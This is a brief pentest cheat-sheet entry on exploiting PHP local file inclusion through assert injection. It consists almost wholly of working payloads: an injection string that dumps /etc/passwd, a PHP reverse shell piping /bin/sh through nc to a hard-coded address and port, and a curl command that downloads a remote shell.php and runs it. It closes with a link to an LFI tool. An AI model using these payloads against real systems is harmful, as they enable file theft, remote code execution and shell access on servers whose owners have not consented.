#### PHP LFI with assert
```
' and die(show_source('/etc/passwd')) or '

TO GET A REVERSE SHELL:

#Create a php reverse shell (shell.php)
<?php
    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.142 9001 >/tmp/f');
?>#Curl and listen (Url Encoded)
' and die(system("curl http://<ip>/shell.php|php")) or '

I USED THE PENTEST MONKEY PHP ONE AND THAT WORKS FINE
```

https://github.com/Poellie01/LFIBuster
